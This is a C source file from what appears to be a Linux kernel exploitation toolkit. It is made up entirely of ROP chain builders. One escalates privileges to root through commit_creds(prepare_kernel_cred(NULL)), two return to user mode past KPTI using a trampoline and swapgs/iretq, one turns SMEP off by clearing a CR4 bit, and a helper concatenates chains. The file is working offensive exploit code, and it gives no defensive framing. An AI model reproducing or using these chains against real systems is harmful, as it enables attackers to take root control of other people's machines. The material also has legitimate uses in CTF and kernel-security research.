#include <stddef.h>
#include <stdint.h>
#include "utils.h"
#include "rop.h"
#include "kpti_trampoline.h"


/* ============= Kcreds ============= */

/* 
 * Privesc to root:
 *      commit_creds(prepare_kernel_cred(NULL)); 
 */

size_t chain_commit_creds(rop_buffer_t rop,
                        uintptr_t pop_rdi_ret,
                        uintptr_t prepare_kernel_cred,
                        rop_buffer_t mov_rdi_rax_rop,
                        uintptr_t commit_creds)
{
    size_t i = 0;

    // Step 1: prepare_kernel_cred(0)
    PUSH_ROP(rop, i, pop_rdi_ret);
    PUSH_ROP(rop, i, 0x0);
    PUSH_ROP(rop, i, prepare_kernel_cred);

    // Step 2: rdi = rax (returned from prepare_kernel_cred)
    for (size_t j = 0; j < mov_rdi_rax_rop.count; ++j) {
        PUSH_ROP(rop, i, mov_rdi_rax_rop.chain[j]);
    }

    // Step 3: commit_creds(rdi)
    PUSH_ROP(rop, i, commit_creds);

    return i;
}


/* ============= KPTI Trampoline ============= */

/* 
 * KPTI trampoline (swapgs_restore_regs_and_return_to_usermode + 22)
 *          +
 * Fake trampoline stack:
 *      junk,
 *      junk,
 *      user_rip,
 *      user_cs,
 *      user_rflags,
 *      user_rsp,
 *      user_ss
 */
size_t chain_kpti_trampoline(rop_buffer_t rop,
                            uintptr_t kpti_trampoline,
                            iretq_user_ctx_t ctx)
{
    size_t i = 0;

    PUSH_ROP(rop, i, kpti_trampoline);
    PUSH_ROP(rop, i, 0);
    PUSH_ROP(rop, i, 0);
    PUSH_ROP(rop, i, ctx.rip);
    PUSH_ROP(rop, i, ctx.cs);
    PUSH_ROP(rop, i, ctx.rflags);
    PUSH_ROP(rop, i, ctx.rsp);
    PUSH_ROP(rop, i, ctx.ss);

    return i;
}


/* ============= iretq ============= */

size_t chain_swapgs_iretq(rop_buffer_t rop,
                        uintptr_t swapgs_pop_rbp_ret,
                        uintptr_t iretq,
                        iretq_user_ctx_t ctx)
{
    size_t i = 0;

    // Step 1: swapgs; pop rbp; ret
    PUSH_ROP(rop, i, swapgs_pop_rbp_ret);
    PUSH_ROP(rop, i, 0xdeadbeef);

    // Step 2: iretq — transition back to userland
    PUSH_ROP(rop, i, iretq);
    PUSH_ROP(rop, i, ctx.rip);
    PUSH_ROP(rop, i, ctx.cs);
    PUSH_ROP(rop, i, ctx.rflags);
    PUSH_ROP(rop, i, ctx.rsp);
    PUSH_ROP(rop, i, ctx.ss);

    return i;
}


/* ============= CR4 =============
 * (depreciated since Linux 5.1)
 */

/* CR4 SMEP off: zero 20th bit */
size_t chain_cr4_smep(rop_buffer_t rop,
                      uintptr_t pop_rdi_ret,
                      uintptr_t cr4_val,
                      uintptr_t mov_cr4_rdi_ret,
                      uintptr_t ret_addr)
{
    size_t i = 0;

    // Disable SMEP by clearing bit 20 of CR4
    cr4_val &= ~(1UL << 20);

    PUSH_ROP(rop, i, pop_rdi_ret);
    PUSH_ROP(rop, i, cr4_val);
    PUSH_ROP(rop, i, mov_cr4_rdi_ret);
    PUSH_ROP(rop, i, ret_addr); // Could be shell, pivot, or userland trampoline

    return i;
}


/* ============= ROP Helpers ==============*/

/*
 * concat_rop_list 
 *
 * @dst:       target ROP buffer to write into
 * @dst_off:   pointer to the current offset (will be updated)
* @list:      array of ROP buffers to concatenate
 * @count:     number of ROP buffers in the list
 */
size_t concat_rop_list(rop_buffer_t dst,
                       size_t *dst_off,
                       const rop_buffer_t *list,
                       size_t count)
{
    // Step 1: calculate total length to write
    size_t total_needed = 0;
    for (size_t i = 0; i < count; ++i)
        total_needed += list[i].count;

    // Step 2: check capacity
    if (*dst_off + total_needed > dst.count)
        DIE("ROP concat would overflow: need %zu, have %zu", *dst_off + total_needed, dst.count);

    // Step 3: safe copy
    for (size_t i = 0; i < count; ++i) {
        for (size_t j = 0; j < list[i].count; ++j) {
            PUSH_ROP(dst, *dst_off, list[i].chain[j]);
        }
    }

    return *dst_off;
}


